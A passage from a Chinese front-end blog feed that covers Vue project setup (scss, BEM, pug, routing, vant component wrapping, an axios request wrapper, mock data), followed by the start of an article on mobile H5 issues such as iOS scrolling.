title="增加样式入口文件"></a>增加样式入口文件</h6><p>最后一步，新建一个入口文件，将样式工具类全部导入进来，供主程序引入。</p><pre><code class="scss">// index.scss 文件import &#39;./reset.scss&#39;;import &#39;./varibles.scss&#39;;improt &#39;./utils/scss&#39;;</code></pre><p>在 <code>main.js</code> 中直接引入 <code>index.scss</code></p><pre><code class="js">import &#39;@/assets/styles/index.scss&#39;</code></pre><h3 id="vue-中写样式要注意哪些方面，有哪些技巧呢？"><a href="#vue-中写样式要注意哪些方面，有哪些技巧呢？" class="headerlink" title="vue 中写样式要注意哪些方面，有哪些技巧呢？"></a>vue 中写样式要注意哪些方面，有哪些技巧呢？</h3><h4 id="避免全局污染"><a href="#避免全局污染" class="headerlink" title="避免全局污染"></a>避免全局污染</h4><p>在页面中写 <code>css/scss</code> 加上 <code>scoped</code>，<code>scoped</code> 的功能就是使页面的样式是局部的，不让影响其他页面的样式。</p><h4 id="bem-规范"><a href="#bem-规范" class="headerlink" title="bem 规范"></a>bem 规范</h4><p>我们大多数人时候会遇到问题，<strong>样式嵌套太多了怎么命名</strong></p><blockquote><p>BEM是块（block）、元素（element）、修饰符（modifier）的简写，由 Yandex 团队提出的一种前端 CSS 命名方法论。</p></blockquote><p>名字太长易读性太差</p><pre><code class="scss">.cardbox {    .cardbox-card {        .cardbox-card-wrapper            .cardbox-card-wrapper-header {                .cardbox-card-wrapper-header-title {                    // ...                }            }            .cardbox-card-wrapper-body{                .cardbox-card-item {                    .cardbox-card-item-title {                        // ...                    }                }          }        }    }}</code></pre><h4 id="bem-使用方式"><a href="#bem-使用方式" class="headerlink" title="bem 使用方式"></a>bem 使用方式</h4><p><code>block-name__element-name--color</code></p><ul><li>区分块，子元素，修饰元素</li><li>块，页面中独立的单元</li><li>子元素，块里面的儿子 <code>card__item</code> 使用 <code>__</code> 连接</li><li>子元素长命名使用 - 连接</li><li>修饰（易变的）<code>card__item--warning</code> 使用 <code>--</code></li></ul><p>我们使用 bem 改造样式</p><pre><code class="scss">.cardbox {    &amp;__header {        &amp;__title {            //...        }    }    &amp;__body {        &amp;__item {            &amp;__title {                //...            }        }    }}</code></pre><blockquote><p>bem 一般推荐子元素嵌套尽量在2-3层以内</p></blockquote><p>但是我们发现样式子元素嵌套有点多，使用了两重子元素嵌套。</p><p>大致原理是<strong>尝试分离父子元素的关系，把卡片本身当作一个块看待。</strong></p><p>下面来试着去减少嵌套：</p><pre><code class="scss">.cardbox {    &amp;__header {        &amp;__title {            //...        }    }    &amp;__body {        .card {            &amp;__title {                //...            }        }    }}</code></pre><p>现在编写样式效率提高也更加规范了，那么编写 HTML 也是有很多累赘的代码。</p><p>比如大多数标签都是前开后闭的。通过 pug 我们可以省略很多字符的敲打，下面我们谈谈如何使用 pug 编写模版。</p><blockquote><p>当然喜欢哪种 HTML 编写风格见人见智啦，我自己更加倾向 pug，那种缩进和简洁的表达，有种在写 scss 的感觉。</p></blockquote><h3 id="如何使用-pug"><a href="#如何使用-pug" class="headerlink" title="如何使用 pug"></a>如何使用 pug</h3><h4 id="实践：类似-sass，首先安装-pug-和-pug-的-loader"><a href="#实践：类似-sass，首先安装-pug-和-pug-的-loader" class="headerlink" title="实践：类似 sass，首先安装 pug 和 pug 的 loader"></a>实践：类似 sass，首先安装 pug 和 pug 的 loader</h4><pre><code>yarn add -D pug pug-html-loader pug-plain-loader</code></pre><h4 id="完成配置"><a href="#完成配置" class="headerlink" title="完成配置"></a>完成配置</h4><pre><code class="js">module.exports = {  // ...  chainWebpack: (config) =&gt; {    config.module      .rule(&#39;pug&#39;)      .test(/\.pug$/)      .use(&#39;pug-html-loader&#39;)      .loader(&#39;pug-html-loader&#39;)      .end()  }}</code></pre><h4 id="编写-pug-代码"><a href="#编写-pug-代码" class="headerlink" title="编写 pug 代码"></a>编写 pug 代码</h4><p>使用 scss 工具与 pug 完美搭配，少写很多代码</p><pre><code class="html">// 登陆&lt;template lang=&quot;pug&quot;&gt;  .login    h1.login__title.ml15 注册/登陆    .login__form.mt15.ml15      van-field.login__form__input(placeholder=&quot;输入手机号&quot; v-model=&quot;phone&quot;)      .login__form__protocol.mt15        .login__form__protocol__tips.dib.text-weak 注册或登录即表示同意        .login__form__protocol__name.dib.color-orange 《用户协议》      app-button.mt15(size=&quot;large&quot;        theme=&quot;orange&quot;        :disabled=&quot;phone.length !== 11&quot;        @click=&quot;handleSubmit&quot;      ) 下一步&lt;/template&gt;</code></pre><p>我们已经引入了样式，接下来我将谈谈其他资源的引入</p><h3 id="如何管理你的资源"><a href="#如何管理你的资源" class="headerlink" title="如何管理你的资源"></a>如何管理你的资源</h3><h4 id="原理与解决方案-2"><a href="#原理与解决方案-2" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h4><p>我暂时把资源分为下面几种</p><ul><li>字体</li><li>ICON</li><li>图片</li><li>样式<br><img src="https://user-gold-cdn.xitu.io/2019/12/30/16f55578916de772?imageslim" alt="资源"><br>把他们各自新建一个目录，都放在 assets 目录下面分门别类，供其他地方调用。<br>使用 alias 更好重命名，使之更便捷的访问到。</li></ul><p>增加 <code>vue.config.js</code> 配置 ,设置<code>assets</code>别名</p><pre><code class="js">const path = require(&#39;path&#39;)function resolve(dir) {  return path.join(__dirname, dir)}module.exports = {  //...  chainWebpack: (config) =&gt; {    config.resolve.alias.set(&#39;@&#39;, resolve(&#39;src&#39;)).set(&#39;@assets&#39;, resolve(&#39;src/assets&#39;))  }}</code></pre><h5 id="ICON"><a href="#ICON" class="headerlink" title="ICON"></a>ICON</h5><h6 id="引入-iconfont"><a href="#引入-iconfont" class="headerlink" title="引入 iconfont"></a>引入 iconfont</h6><ul><li>(1) <a href="https://www.iconfont.cn/manage/index" target="_blank" rel="noopener">iconfont</a> 阿里图标项目中下载，将整个项目图标包一起下载下来</li></ul><p><img src="https://user-gold-cdn.xitu.io/2019/12/27/16f462a5119bdcdf?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="ICON"></p><ul><li>(2) 引入 iconfont 样式<br>需要下面四个文件</li></ul><ul><li><code>iconfont.eot</code></li><li><code>iconfont.ttf</code></li><li><code>iconfont.woff</code></li><li><code>iconfont.woff2</code></li></ul><ul><li>(3)  项目中引入 iconfont</li></ul><p>让 <code>icon</code> 组件化</p><pre><code class="html">&lt;template&gt;  &lt;i class=&quot;iconfont&quot; v-on=&quot;$listeners&quot; :class=&quot;name&quot;&gt;&lt;/i&gt;&lt;/template&gt;&lt;script&gt;export default {  props: {    name: String  }}&lt;/script&gt;&lt;style lang=&quot;scss&quot; scoped&gt;.iconfont {  font-size: 16px;  color: $color-icon;}&lt;/style&gt;</code></pre><h6 id="引入图片作为-ICON"><a href="#引入图片作为-ICON" class="headerlink" title="引入图片作为 ICON"></a>引入图片作为 ICON</h6><p>让图片组件化，我们再来写一个 img 组件</p><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  img(    :src=&quot;require(`@/assets/images/${name}.png`)&quot;    v-bind=&quot;$attrs&quot;    v-on=&quot;$listeners&quot;    :style=&quot;{&#39;width&#39;: width ? width + &#39;px&#39; : size + &#39;px&#39;, &#39;height&#39;: height ? height + &#39;px&#39; : size + &#39;px&#39; }&quot;)&lt;/template&gt;&lt;script&gt;export default {  name: &#39;app-img&#39;,  props: {    name: {      type: String,      default: &#39;&#39;    },    size: {      type: Number,      default: 16    },    width: {      type: Number,      default: 0    },    height: {      type: Number,      default: 0    }  }}&lt;/script&gt;</code></pre><h3 id="如何管理你的路由"><a href="#如何管理你的路由" class="headerlink" title="如何管理你的路由"></a>如何管理你的路由</h3><h4 id="原理与解决方案-3"><a href="#原理与解决方案-3" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h4><p>使用 vue-router，使用<code>import()</code> 生成异步路由，只有在访问时候才会加载模块。</p><p>为什么使用 <code>import()</code> 会异步加载模块？</p><blockquote><p>MDN：在您希望按照一定的条件或者按需加载模块的时候，动态import() 是非常有用的。而静态型的 import 是初始化加载依赖项的最优选择，使用静态 import 更容易从代码静态分析工具和 tree shaking 中受益。</p></blockquote><p>说白了就是起到一个<strong>按需加载</strong>的目的。现在大多数实现的按需加载，基本都是依赖 <code>import()</code> 这个方法。</p><h5 id="安装-vue-router"><a href="#安装-vue-router" class="headerlink" title="安装 vue-router"></a>安装 vue-router</h5><pre><code class="sh">yarn add vue-router</code></pre><p>安装完 <code>router</code>，在编写 <code>router</code> 先创建页面</p><h5 id="新建一个空页面"><a href="#新建一个空页面" class="headerlink" title="新建一个空页面"></a>新建一个空页面</h5><p>src 目录下新增 views 目录存放页面文件。创建 index 目录和 home 页面</p><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  .home 首页&lt;/template&gt;&lt;script&gt;export default {}&lt;/script&gt;&lt;style lang=&quot;scss&quot; scoped&gt;&lt;/style&gt;</code></pre><h5 id="编写路由"><a href="#编写路由" class="headerlink" title="编写路由"></a>编写路由</h5><pre><code class="js">const routes = [    {        // 首页        path: &#39;/&#39;,        name: &#39;index&#39;,        redirect: &#39;/home&#39;,        component: App,        children: [            {                // 首页                path: &#39;home&#39;,                name: &#39;home&#39;,                // 路由懒加载                component: () =&gt;                    import(                        /* webpackChunkName: &quot;index&quot; */ &#39;../views/index/home.vue&#39;                    )            }        ]    }]Vue.use(VueRouter)const router = new VueRouter({    mode: &#39;history&#39;,    routes: routes,    base: process.env.BASE_URL,    props: true})export default router</code></pre><h5 id="为了消除-显得路径更加好看简洁，我们采用-history-模式，但是-history-模式有个问题就是，异步路由没有缓存在页面中，第一次进入页面会找不到"><a href="#为了消除-显得路径更加好看简洁，我们采用-history-模式，但是-history-模式有个问题就是，异步路由没有缓存在页面中，第一次进入页面会找不到" class="headerlink" title="为了消除 # 显得路径更加好看简洁，我们采用 history 模式，但是 history 模式有个问题就是，异步路由没有缓存在页面中，第一次进入页面会找不到"></a>为了消除 # 显得路径更加好看简洁，我们采用 history 模式，但是 history 模式有个问题就是，异步路由没有缓存在页面中，第一次进入页面会找不到</h5><p>在 vue.config.js 中增加配置，开发环境可以访问到，恢复正常</p><pre><code class="js">module.exports = {  // ...  devServer: {    historyApiFallback: true  }}</code></pre><blockquote><p>关于路由还有很多可以研究到地方，可以自行研究哦！</p></blockquote><h3 id="组件化开发"><a href="#组件化开发" class="headerlink" title="组件化开发"></a>组件化开发</h3><h4 id="原理与解决方案-4"><a href="#原理与解决方案-4" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h4><p>一般来说，我们根据组件的复用度，分给基础（公共）组件和业务组件。</p><p>为了节省时间，快速开发，这里基础组件大部分引用开源组件。当然不能直接就用哦。</p><p>一般要进行二次封装，也就是高阶组件开发。</p><ol><li>通过修改和覆盖当前组件的样式来达到修改样式的作用。</li><li>通过拦截事件来更改js的逻辑。</li></ol><p>下面我们先引入 <code>vant</code> 组件</p><h4 id="实践-3"><a href="#实践-3" class="headerlink" title="实践"></a>实践</h4><h5 id="引入-vant"><a href="#引入-vant" class="headerlink" title="引入 vant"></a>引入 vant</h5><pre><code class="sh">yarn add vant</code></pre><h4 id="对基础组件进行二次封装和改造"><a href="#对基础组件进行二次封装和改造" class="headerlink" title="对基础组件进行二次封装和改造"></a>对基础组件进行二次封装和改造</h4><p>下面 7 步来写好一个公共组件</p><ul><li>(1) 新建一个 <code>components</code> 目录来存放基础组件</li><li>(2) 基础组件命名为 <code>app-xxx</code> 或 <code>appXxx</code>，新建一个 <code>app-button</code> 目录，新建 <code>index.vue</code></li><li>(3) 根据设计稿设计和编写组件<blockquote><p>编写组件之前首先要设计组件，根据组件的不变性和可变性原则编写。不变性是组件的核心，可变性根据参数对组件对相关部分进行调节，实现可选择的功能。</p></blockquote></li><li>(4) 实现组件</li></ul><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  div.dib    van-button.btn(      @click=&quot;$emit(&#39;click&#39;)&quot;      :class=&quot;getClass&quot; v-bind=&quot;$attrs&quot;      :style=&quot;{&#39;width&#39;: size === &#39;large&#39; ? &#39;345px&#39;: &#39;&#39;, &#39;backgroundColor&#39;: getBgColor, borderColor: getBgColor, color: getBgColor}&quot;)      slot&lt;/template&gt;&lt;script&gt;import { Button } from &#39;vant&#39;import Vue from &#39;vue&#39;import { getColor } from &#39;@/utils&#39;Vue.use(Button)export default {  name: &#39;app-button&#39;,  props: {    type: {      type: String,      default: &#39;primary&#39;    },    theme: {      type: String,      default: &#39;blue&#39;    },    size: {      type: String,      default: &#39;&#39;    }  },  computed: {    getClass() {      if (!this.type) {        return &#39;&#39;      }      return `app-btn--${this.type}`    },    getBgColor() {      if (!this.theme) {        return &#39;&#39;      }      return getColor(this.theme)    }  }}&lt;/script&gt;&lt;style lang=&quot;scss&quot; scoped&gt;.app-btn  {  ::v-deep &amp;--primary {    padding: 8px 30px;    height: 40px;    border-radius: 4px;    font-size: 15px;    font-weight: 400;    line-height: 19px;    color: white!important;  }  ::v-deep &amp;--minor {    padding: 5px 10px;    height: 26px;    border-radius: 14px;    font-size: 12px;    font-weight: 400;    line-height: 16px;    background-color: #fff!important;  }  ::v-deep &amp;--rect {    padding: 5px px;    height: 49px;    font-size: 14px;    color: white!important;  }}&lt;/style&gt;</code></pre><blockquote><p>::v-deep  样式深覆盖，scoped 情况下覆盖组件样式，不改变其样式</p></blockquote><ul><li>(5) 写好基础组件 README，为什么要写文档呢？如果多人开发同一个项目，基础组件会被其他人引用。方便其他人使用，所以要写文档。</li></ul><blockquote><p>一句话言：只要可能被其他人用的公共方法和组件，注释或文档是很重要的，对自己的代码负责哈。</p></blockquote><p>其他用法参照 vant</p><ul><li>(6) 全局引用，基础组件许多页面都会用到，将其设置成全局组件，其他地方就不必再引用了哦。</li></ul><p>新建一个文件 <code>global</code> 存放全局组件注册，在 <code>main.js</code> 引入</p><pre><code class="javascript">import Vue from &#39;vue&#39;import appButton from &#39;@/components/app-button&#39;Vue.component(&#39;app-button&#39;, appButton)</code></pre><ul><li>(7) 写好 <code>demo</code>，即使暂时不写单元测试，也要写好一个 <code>demo</code>，使之能正常的运行</li></ul><p>添加 demo 页面和路由</p><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  div(class=&quot;base&quot;)    // 按钮组件    app-button.mt4(theme=&quot;blue&quot;) 确认支付    app-button(theme=&quot;orange&quot;) 确认支付    app-button(theme=&quot;purple&quot;) 确认支付    app-button.mt4(theme=&quot;red&quot;) 确认支付    app-button(theme=&quot;grey&quot;) 确认支付    app-button.mt4(theme=&quot;blue&quot; size=&quot;large&quot;) 修改地址    app-button.mt4(theme=&quot;orange&quot; size=&quot;large&quot;) 修改地址    app-button.mt4(theme=&quot;purple&quot; size=&quot;large&quot;) 修改地址    app-button.mt4(theme=&quot;red&quot; size=&quot;large&quot;) 修改地址    app-button.mt4(theme=&quot;grey&quot; size=&quot;large&quot;) 修改地址    app-button.mt4(theme=&quot;blue&quot; type=&quot;minor&quot;) 确认收货    app-button(theme=&quot;orange&quot; type=&quot;minor&quot;) 确认收货    app-button(theme=&quot;purple&quot; type=&quot;minor&quot;) 确认收货    app-button(theme=&quot;red&quot; type=&quot;minor&quot;) 修改地址    app-button(theme=&quot;grey&quot; type=&quot;minor&quot;) 修改地址    app-button.mt4(theme=&quot;blue&quot; type=&quot;rect&quot;) 确认收货    app-button(theme=&quot;orange&quot; type=&quot;rect&quot;) 确认收货    app-button(theme=&quot;purple&quot; type=&quot;rect&quot;) 确认收货    app-button(theme=&quot;red&quot; type=&quot;rect&quot;) 修改地址    app-button(theme=&quot;grey&quot; type=&quot;rect&quot;) 修改地址&lt;/template&gt;&lt;script&gt;export default {}&lt;/script&gt;&lt;style lang=&quot;scss&quot;&gt;&lt;/style&gt;</code></pre><h4 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h4><p><img src="https://user-gold-cdn.xitu.io/2019/12/30/16f55700de463c65?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><h3 id="如何封装请求"><a href="#如何封装请求" class="headerlink" title="如何封装请求"></a>如何封装请求</h3><h4 id="原理与解决方案-5"><a href="#原理与解决方案-5" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h4><p>基本上就是对 axios 的封装，封装主要有两个目的。</p><ul><li>修改一些基础的配置：请求地址，超时，其他的杂七杂八的</li><li>统一操作：统一处理错误，统一处理请求参数和格式，响应参数和格式。统一处理 message，统一拦截挂载等等。</li></ul><p>网上已经有很多类似的文章了， 我这里给出我常用的封装方案。</p><h4 id="实践-4"><a href="#实践-4" class="headerlink" title="实践"></a>实践</h4><h5 id="根据不同环境设置请求地址"><a href="#根据不同环境设置请求地址" class="headerlink" title="根据不同环境设置请求地址"></a>根据不同环境设置请求地址</h5><pre><code class="js">// .env-default.js 文件// 不同环境访问不同的路径const api = {  develop: &#39;http://xxxx:8080&#39;,  mock: &#39;http://xxxx&#39;,  feature: &#39;http://xxxx&#39;,  test: &#39;http://xxxx&#39;,  production: &#39;http://xxxx&#39;}export const baseURL = api[process.env.NODE_ENV || &#39;dev&#39;]</code></pre><blockquote><p>因为每个人开发环境，mock环境不一定相同，这个文件建议 gitignore忽略掉。模版可以写在 readme 文档中，启动项目时加入文件。</p></blockquote><h5 id="新建一个-utils-工具"><a href="#新建一个-utils-工具" class="headerlink" title="新建一个 utils 工具"></a>新建一个 <code>utils</code> 工具</h5><p>我们现在将 axios 封装成我们自己需要的配置，然后定义四个常用的请求方法供调用</p><pre><code class="js">// utils/http.js 文件import axios from &#39;axios&#39;import { baseURL } from &#39;../../.env-defalut.js&#39;// axios 配置const defaultBaseUrl = &#39;http://localhost:8080/&#39;// 默认超时时间axios.defaults.timeout = 15000// 数据接口域名统一配置.envaxios.defaults.baseURL = baseURL || defaultBaseUrl // http request 拦截器axios.interceptors.request.use(  (config) =&gt; {    config.headers = {    }    return config  },  (err) =&gt; {    return Promise.reject(err)  })// http response 拦截器axios.interceptors.response.use(  (response) =&gt; {    return response  },  (error) =&gt; {    const data = error.response.data    return Promise.reject(data || error)  })export default axios/** * fetch 请求方法 * @param {*} url * @param {*} params */export function fetch(url, params = {}) {  return new Promise((resolve, reject) =&gt; {    axios      .get(url, {        params: params      })      .then((response) =&gt; {        resolve(response.data)      })      .catch((err) =&gt; {        reject(err)      })  })}/** * post 请求方法，发送数据格式 json * @param {*} url * @param {*} data */export function post(  url,  data = {},  config = {    transformRequest: [      function(fData, headers) {        headers[&#39;Content-Type&#39;] = &#39;application/json&#39;        return JSON.stringify(fData)      }    ]  }) {  return new Promise((resolve, reject) =&gt; {    axios.post(url, data, config).then(      (response) =&gt; {        resolve(response.data)      },      (err) =&gt; {        reject(err)      }    )  })}/** * patch 请求方法，发送数据格式 json * @param {*} url * @param {*} data */export function patch(url, data = {}) {  return new Promise((resolve, reject) =&gt; {    axios      .patch(url, data, {        transformRequest: [          function(fData, headers) {            headers[&#39;Content-Type&#39;] = &#39;application/json&#39;            return JSON.stringify(fData)          }        ]      })      .then(        (response) =&gt; {          resolve(response.data)        },        (err) =&gt; {          reject(err)        }      )  })}export function del(url, data) {  return new Promise((resolve, reject) =&gt; {    axios.delete(url, { data }).then(      (response) =&gt; {        resolve(response.data)      },      (err) =&gt; {        reject(err)      }    )  })}</code></pre><h3 id="如何管理-api"><a href="#如何管理-api" class="headerlink" title="如何管理 api"></a>如何管理 api</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>首先要制定一个 api 的原则<br>我的原则一般是这些：</p><ul><li>干净纯粹</li><li>尽量不要处理数据</li><li>独立单一不要互相依赖</li></ul><p>好处在于：不在 api 里面处理数据，api里面的接口和接口文档上一样。避免别人引用我的api，还要去看代码，只需要看文档就好了。</p><blockquote><p>例子：想象这样一种情况，别人引用了我的 api，突然发现响应数据不对。首先它排查到页面数据没更改。看了api文档，数据也没问题，最后发现我在写 api 的时候进行了处理，这个 api 呢又不能改动，改了影响我自己的模块。只能它在重新写一个api，这样显得很繁杂了，不够干净优雅。</p></blockquote><pre><code class="js">import { fetch, post } from &#39;@/utils/http&#39;// 用户登陆export const login = data =&gt; post(&#39;/user/login&#39;, data)// 获取用户信息export const getUserInfo = (data) =&gt; fetch(&#39;/api/user/info&#39;, data)</code></pre><p>如果需要处理数据，要么使用一个中间工具处理，要么在页面里面处理。当然还是实际问题实际分析。</p><h3 id="如何使用mock模拟数据"><a href="#如何使用mock模拟数据" class="headerlink" title="如何使用mock模拟数据"></a>如何使用<code>mock</code>模拟数据</h3><h4 id="原理与解决方案-6"><a href="#原理与解决方案-6" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h4><p>一般就是两种方案，一是模拟后端，使用远程在线 JSON 服务器。另外一种搭建本地 JSON 或者 使用现成的 Node 服务器拦截请求。</p><blockquote><p>这两种方式各有千秋，没有优劣之分，适合就是最好的。</p></blockquote><h4 id="远程在线mock"><a href="#远程在线mock" class="headerlink" title="远程在线mock"></a>远程在线<code>mock</code></h4><p>我用过的远程在线<code>mock</code></p><ul><li>apizza：好用，功能齐全，喜欢他的文件展开目录<code>api</code>，免费版只支持 2 个人共同编辑</li><li>swagger：开源免费，<code>api</code>管理太凌乱，</li><li>rap/rap2：开源免费，可以搭建本地<code>api</code>，需要自己搭建</li></ul><p>使用远程<code>mock</code>的优点：</p><ul><li>不需要在项目内部增加<code>mock</code></li><li>功能更加全面完善</li><li>可以在接口文档基础上<code>mock</code>，与接口文档放在一起查看更加方便。</li></ul><p>缺点：需要自己另外搭建服务器，只支持静态的<code>mock</code>，不能与单元测试结合使用</p><h4 id="本地JSON-mock"><a href="#本地JSON-mock" class="headerlink" title="本地JSON mock"></a>本地JSON mock</h4><ul><li>使用 <code>webpack</code> 内部 mock 配置</li></ul><pre><code class="js">devServer: {    // 接口未实现情况下，使用mock    before: require(&#39;./mock&#39;)}</code></pre><p>基本原理：主要是使用 node 读取文件，转换成 JSON 格式，使用<code>mock.js</code> 模拟数据，最后 webpack 拦截请求生成<code>json</code>响应数据</p><pre><code class="js">const Mock = require(&#39;mockjs&#39;)module.exports = (app) =&gt; {    function getJsonFile (filePath) {        var json = fs.readFileSync(path.resolve(__dirname, filePath), &#39;utf-8&#39;)        return JSON.parse(json)    },    const returnMock = (datafile, res, req) =&gt; {        setTimeout(() =&gt; {            var json            if (/\.json$/.test(datafile)) {                // json文件暴露的是mock的模板                json = getJsonFile(datafile)            } else if (/\.js$/.test(datafile)) {                json = require(datafile)(req.query)            }            res.json(Mock.mock(json))        }, 500)    }}</code></pre><ul><li>使用 <code>json-server</code> 搭建<br>主要分为下面几步</li></ul><ol><li><code>npm</code> 安装 <code>json-server</code></li><li>编写 <code>npm</code> 脚本命令，引入 <code>mock</code> 配置文件</li><li>编写 <code>mock</code> 路由匹配规则<blockquote><p>比较简单这里不详细描述了！</p></blockquote></li></ol><p>本地的缺点在于需要</p><ul><li>前端需要根据<code>api</code>文档写<code>mock</code>数据格式</li><li>功能没有远程<code>mock</code>那么完善，支持<code>restful</code>需要去研究下</li><li>也是需要配置相关<code>mock</code>工具</li></ul><p>优点在于</p><ul><li>不用查看编辑<code>api</code>文档</li><li>在代码中就可以更改和查看<code>mock</code>数据</li><li>支持使用<code>JavaScipt</code>动态处<code>mock</code>，可以与单元测试结合使用</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://github.com/commitizen/cz-cli" target="_blank" rel="noopener">commitizen</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/import" target="_blank" rel="noopener">MDN import()</a></li><li><a href="https://youzan.github.io/vant/#/zh-CN/intro" target="_blank" rel="noopener">vant 文档</a></li><li><a href="https://eslint.org/" target="_blank" rel="noopener">eslint 文档</a></li><li><a href="https://router.vuejs.org/zh/" target="_blank" rel="noopener">vue-router 文档</a></li><li><a href="https://www.sasscss.com/getting-started/" target="_blank" rel="noopener">sass 文档</a></li><li><a href="https://github.com/axios/axios" target="_blank" rel="noopener">axios 文档</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5e0202fc6fb9a0165721e39a&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;概览&quot;&gt;&lt;a href=&quot;#概览&quot; class=&quot;he
      
    
    </summary>
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/categories/Vue/"/>
    
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>12个前端必会 H5 问题及解决方法</title>
    <link href="https://zhanghao-web.github.io/2020/05/05/HTML5/12%E4%B8%AA%E5%89%8D%E7%AB%AF%E5%BF%85%E4%BC%9A-H5-%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>https://zhanghao-web.github.io/2020/05/05/HTML5/12个前端必会-H5-问题及解决方法/</id>
    <published>2020-05-05T13:14:45.000Z</published>
    <updated>2020-05-06T00:48:42.264Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/suoyuesmile/suo-blog/blob/master/articals/h5/0003.md" target="_blank" rel="noopener">原文地址</a></p><h1 id="移动端-H5-相关问题汇总："><a href="#移动端-H5-相关问题汇总：" class="headerlink" title="移动端 H5 相关问题汇总："></a>移动端 H5 相关问题汇总：</h1><ul><li>1px 问题</li><li>响应式布局</li><li>iOS 滑动不流畅</li><li>iOS 上拉边界下拉出现白色空白</li><li>页面件放大或缩小不确定性行为</li><li>click 点击穿透与延迟</li><li>软键盘弹出将页面顶起来、收起未回落问题</li><li>iPhone X 底部栏适配问题</li><li>保存页面为图片和二维码问题和解决方案</li><li>微信公众号 H5 分享问题</li><li>H5 调用 SDK 相关问题及解决方案</li><li>H5 调试相关方案与策略</li></ul><h1 id="移动端-H5-相关基础技术概览"><a href="#移动端-H5-相关基础技术概览" class="headerlink" title="移动端 H5 相关基础技术概览"></a>移动端 H5 相关基础技术概览</h1><p><img src="https://camo.githubusercontent.com/fd55251b2784c435753d675301fb4bfa7aef733b/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f32342f313666333638373230643365623432313f773d3232303626683d3131343026663d6a70656726733d323437373332" alt="H5"></p><p><a href="https://juejin.im/post/5df3053ce51d45583d425ada" target="_blank" rel="noopener">1px问题</a><br><a href="https://juejin.im/post/5df59139518825123e7af459" target="_blank" rel="noopener">响应式布局</a></p><h2 id="iOS-滑动不流畅"><a href="#iOS-滑动不流畅" class="headerlink" title="iOS 滑动不流畅"></a>iOS 滑动不流畅</h2><h3 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h3><p>上下滑动页面会产生卡顿，手指离开页面，页面立即停止运动。整体表现就是滑动不流畅，没有滑动惯性。</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p><strong>为什么 iOS 的 webview 中 滑动不流畅，它是如何定义的</strong></p><p>最终我在 <code>safari</code> 文档里面寻找到了答案（文档链接在参考资料项）。</p><p><img src="https://camo.githubusercontent.com/dae1dc14e59ea49999123abbf133f60bd8f5fa2a/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f31392f313666316461616237633431653034343f773d3134323026683d3131303426663d6a70656726733d313635343933" alt="safari文档"></p><p>原来在 <code>iOS 5.0</code> 以及之后的版本，滑动有定义有两个值 <code>auto</code> 和 <code>touch</code>，默认值为 <code>auto</code>。</p><pre><code class="css">-webkit-overflow-scrolling: touch; /* 当手指从触摸屏上移开，会保持一段时间的滚动 */-webkit-overflow-scrolling: auto; /* 当手指从触摸屏上移开，滚动会立即停止 */</code></pre><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1.在滚动容器上增加滚动 touch 方法</p><p>将<code>-webkit-overflow-scrolling</code> 值设置为 <code>touch</code></p><pre><code class="css">.wrapper {    -webkit-overflow-scrolling: touch;}</code></pre><p>设置滚动条隐藏： </p><pre><code class="css">.container ::-webkit-scrollbar {display: none;}</code></pre><p>可能会导致使用<code>position:fixed;</code> 固定定位的元素，随着页面一起滚动</p><p>2.设置 overflow</p><p>设置外部 <code>overflow</code> 为 <code>hidden</code>,设置内容元素 <code>overflow</code> 为 <code>auto</code>。内部元素超出 body 即产生滚动，超出的部分 body 隐藏。</p><pre><code class="css">body {    overflow-y: hidden;}.wrapper {    overflow-y: auto;}</code></pre><p><strong>两者结合使用更佳！</strong></p><h2 id="iOS-上拉边界下拉出现白色空白"><a href="#iOS-上拉边界下拉出现白色空白" class="headerlink" title="iOS 上拉边界下拉出现白色空白"></a>iOS 上拉边界下拉出现白色空白</h2><h3 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h3><p>手指按住屏幕下拉，屏幕顶部会多出一块白色区域。手指按住屏幕上拉，底部多出一块白色区域。</p><h3 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h3><p>在 iOS 中，手指按住屏幕上下拖动，会触发 <code>touchmove</code> 事件。这个事件触发的对象是整个 <code>webview</code> 容器，容器自然会被拖动，剩下的部分会成空白。</p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><ol><li>监听事件禁止滑动<br>移动端触摸事件有三个，分别定义为</li></ol><ul><li><ol><li>touchstart ：手指放在一个DOM元素上。</li></ol></li><li><ol start="2"><li>touchmove ：手指拖曳一个DOM元素。</li></ol></li><li><ol start="3"><li>touchend ：手指从一个DOM元素上移开。<br>显然我们需要控制的是 <code>touchmove</code> 事件，由此我在 W3C 文档中找到了这样一段话</li></ol></li></ul><p><code>Note that the rate at which the user agent sends 